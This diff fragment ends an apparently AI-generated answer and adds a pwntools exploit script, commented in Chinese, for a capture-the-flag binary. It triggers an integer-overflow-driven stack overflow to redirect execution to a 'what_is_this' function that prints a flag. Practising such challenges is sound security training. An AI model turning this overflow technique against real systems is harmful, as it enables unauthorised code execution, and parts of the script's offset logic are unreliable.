@@ -111,3 +111,71 @@ AIMessage(content='1) To solve this challenge using pwntools, we leverage an int
  '**Note:** Ensure that the binary path and any addresses used (like '
  '`what_is_this_addr`) are correct for your environment. The offset may also '
  'vary, so adjust the payload accordingly based on the core dump analysis.')
+
+from pwn import *
+
+# 替换为实际的二进制文件名
+binary_path = './vulnerable_binary'
+
+# 加载二进制文件
+elf = ELF(binary_path)
+
+# 启动进程（或根据需要使用远程连接）
+p = process(binary_path)
+# 对于远程连接，请使用: p = remote('hostname', port)
+
+# `what_is_this`函数的地址
+what_is_this_addr = elf.symbols['what_is_this']
+log.info(f"Address of 'what_is_this': {hex(what_is_this_addr)}")
+
+# 步骤1：创建循环模式以找到EIP的偏移量
+payload_length = 300  # 长度超过255以导致整数溢出
+payload = cyclic(payload_length)
+
+# 与程序交互，发送初始有效载荷
+p.recvuntil(b'Your choice:')
+p.sendline(b'1')  # 选择'Login'选项
+
+p.recvuntil(b'Please input your username:')
+p.sendline(b'user')  # 发送虚拟用户名
+
+p.recvuntil(b'Please input your passwd:')
+p.sendline(payload)  # 发送循环模式作为密码
+
+# 等待程序崩溃
+p.wait()
+
+# 加载核心转储以找到偏移量
+core = p.corefile
+
+# 检索崩溃时EIP的值
+eip_value = core.eip
+log.info(f"EIP value at crash: {hex(eip_value)}")
+
+# 在循环模式中找到EIP的偏移量
+offset = cyclic_find(eip_value)
+log.info(f"Offset to EIP: {offset}")
+
+# 步骤2：构造有效载荷以覆盖返回地址
+# 由于v3（长度变量）是无符号字符，长度超过255会导致溢出
+password_length = 264  # 长度超过255；264 % 256 = 8
+padding_length = offset - password_length
+
+payload = b'A' * password_length  # 导致v3在溢出后为8
+payload += b'B' * padding_length  # 填充至返回地址
+payload += p32(what_is_this_addr)  # 覆盖返回地址为`what_is_this`的地址
+
+# 步骤3：发送构造的有效载荷以利用漏洞
+p = process(binary_path)  # 重新启动进程
+
+p.recvuntil(b'Your choice:')
+p.sendline(b'1')  # 再次选择'Login'选项
+
+p.recvuntil(b'Please input your username:')
+p.sendline(b'user')  # 发送虚拟用户名
+
+p.recvuntil(b'Please input your passwd:')
+p.sendline(payload)  # 发送构造的有效载荷
+
+# 步骤4：与程序交互以获取标志
+p.interactive()  # 应该显示来自`what_is_this`函数的标志
